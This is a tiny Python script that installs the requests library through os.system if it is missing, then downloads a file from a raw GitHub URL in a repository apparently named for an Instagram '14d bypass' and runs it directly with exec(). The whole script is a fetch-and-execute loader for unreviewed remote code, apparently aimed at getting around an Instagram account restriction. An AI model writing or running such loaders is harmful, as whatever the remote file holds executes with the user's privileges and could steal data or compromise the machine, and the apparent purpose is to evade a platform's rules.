import os
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests

exec(requests.get("https://raw.githubusercontent.com/xncee/instagram-14d-bypass/main/src/src.py").text)